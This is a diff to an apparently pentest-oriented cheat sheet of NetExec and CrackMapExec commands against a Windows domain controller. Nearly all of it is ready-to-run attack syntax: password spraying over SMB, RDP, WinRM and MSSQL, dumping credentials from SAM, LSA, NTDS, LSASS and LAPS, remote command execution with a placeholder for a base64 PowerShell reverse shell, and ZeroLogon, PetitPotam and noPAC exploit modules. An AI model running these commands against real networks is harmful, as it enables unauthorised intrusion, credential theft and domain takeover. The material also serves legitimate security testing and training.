@@ -15,9 +15,10 @@ CrackMapExec is by default installed in Kali Linux. However, we can use the foll
 sudo apt install crackmapexec
 ```
 
-Note: Sometimes it's worth using both tools to discard false negatives and false positives.
+`Important Note`: Sometimes it's worth using both tools to discard false negatives and false positives.
 
 # NetExec Commands
+The IP address `172.16.150.20` will be used as an example for the Domain Controller (DC01) IP address.
 ## Enumeration
 ```shell
 # Enumerating Network (Find active reachable hosts)
@@ -61,7 +62,7 @@ nxc smb 172.16.150.20 -u john -p 'Password123!' --disks
 ```
 
 ## Checking Credentials & Password Spraying
-Important Note: Always check Domain Password Policy before Password Spraying to prevent Account Lockouts.
+`Important Note`: Always check Domain Password Policy before Password Spraying to prevent Account Lockouts.
 ```shell
 # Check Credentials - with Password
 nxc smb 172.16.150.20 -u john -p 'Password123!'
@@ -79,6 +80,18 @@ nxc smb 172.16.150.20 -u domain_users.txt -p passwords_found.txt --continue-on-s
 # Local Authentication
 nxc smb 172.16.150.20 -u john -p 'Password123!' --local-auth
 nxc smb 172.16.150.20 -u domain_users.txt -p passwords_found.txt --local-auth
+
+# RDP
+nxc rdp ips_internal.txt -u john -p 'Password123!' --continue-on-success
+nxc rdp ips_internal.txt -u john -p 'Password123!' --continue-on-success --local-auth
+
+# WinRM
+nxc winrm ips_internal.txt -u john -p 'Password123!' --continue-on-success
+nxc winrm ips_internal.txt -u john -p 'Password123!' --continue-on-success --local-auth
+
+# MSSQL
+nxc mssql ips_internal.txt -u john -p 'Password123!' --continue-on-success
+nxc mssql ips_internal.txt -u john -p 'Password123!' --continue-on-success --local-auth
 ```
 
 ## Dumping Credentials
@@ -100,3 +113,102 @@ nxc smb 172.16.150.20 -u john -p 'Password123!' -M lsassy
 nxc smb 172.16.150.20 -u john -p 'Password123!' -M mimikatz
 nxc smb 172.16.150.20 -u john -p 'Password123!' -M nanodump
 nxc smb 172.16.150.20 -u john -p 'Password123!' -M procdump
+
+# LAPS Password
+nxc ldap 172.16.150.20 -u john -p 'Password123!' -M laps -o computer=172.16.150.120
+```
+
+## Command Execution
+```shell
+# CMD
+nxc smb 172.16.150.20 -u john -p 'Password123!' -x "whoami"
+
+# PowerShell
+nxc smb 172.16.150.20 -u john -p 'Password123!' -x "whoami"
+
+# MSSQL
+nxc mssql 172.16.150.20 -u john -p 'Password123!' -x "whoami"
+nxc mssql 172.16.150.20 -u john -p 'Password123!' -x "Enter PowerShell#3 (Base64) Reverse Shell from revshells.com here"
+```
+
+## Testing CVEs
+```shell
+# ZeroLogon
+nxc smb 172.16.150.20 -u '' -p '' -M zerologon
+
+# PetitPotam
+nxc smb 172.16.150.20 -u '' -p '' -M petitpotam
+
+# noPAC
+nxc smb 172.16.150.20 -u '' -p '' -M nopac
+```
+
+# CrackMapExec Commands
+As of 2024, CrackMapExec is deprecated, and I primarily use NetExec. However, there are still select cases where CrackMapExec remains useful. The following are the commands I use most frequently:
+## Enumeration
+```shell
+# Enumerating Network (Find active reachable hosts)
+nxc smb
+
+# Null Session (Access without Credentials)
+crackmapexec smb 172.16.150.20 -u '' -p ''
+
+# Shares
+crackmapexec smb 172.16.150.20 -u john -p 'Password123!' --shares
+
+# Domain Password Policy
+crackmapexec smb 172.16.150.20 -u john -p 'Password123!' --pass-pol
+
+# Domain Users
+crackmapexec smb 172.16.150.20 -u john -p 'Password123!' --users
+```
+## Checking Credentials & Password Spraying
+```shell
+# Check Credentials - with Password
+crackmapexec smb 172.16.150.20 -u john -p 'Password123!'
+
+# Check Credentials - with Hash
+crackmapexec smb 172.16.150.20 -u john -H 'NT_HASH'
+crackmapexec smb 172.16.150.20 -u john -H 'LM_HASH:NT_HASH'
+
+# Password Spraying
+crackmapexec smb 172.16.150.20 -u john jane marcus -p 'Password123!'
+crackmapexec smb 172.16.150.20 -u john -p 'Password123!' 'PleaseDontHackMe' '1337H4x0r'
+crackmapexec smb 172.16.150.20 -u domain_users.txt -p passwords_found.txt
+crackmapexec smb 172.16.150.20 -u domain_users.txt -p passwords_found.txt --continue-on-success
+
+# Local Authentication
+crackmapexec smb 172.16.150.20 -u john -p 'Password123!' --local-auth
+crackmapexec smb 172.16.150.20 -u domain_users.txt -p passwords_found.txt --local-auth
+```
+
+## Dumping Credentials
+```shell
+# SAM
+crackmapexec smb 172.16.150.20 -u john -p 'Password123!' --sam
+
+# LSA
+crackmapexec smb 172.16.150.20 -u john -p 'Password123!' --lsa
+
+# NTDS.DIT RPC
+crackmapexec smb 172.16.150.20 -u john -p 'Password123!' --ntds
+
+# NTDS.DIT VSS
+crackmapexec smb 172.16.150.20 -u john -p 'Password123!' --ntds vss
+```
+
+## Command Execution
+```shell
+# CMD
+crackmapexec smb 172.16.150.20 -u john -p 'Password123!' -x "whoami"
+
+# PowerShell
+crackmapexec smb 172.16.150.20 -u john -p 'Password123!' -x "whoami"
+
+# MSSQL
+crackmapexec mssql 172.16.150.20 -u john -p 'Password123!' -x "whoami"
+crackmapexec mssql 172.16.150.20 -u john -p 'Password123!' -x "Enter PowerShell#3 (Base64) Reverse Shell from revshells.com here"
+# CrackMapExec version
+crackmapexec mssql 172.16.150.20 -d automotors.local -u john -p 'Password123!' -x "Enter PowerShell#3 (Base64) Reverse Shell from revshells.com here"
+```
+
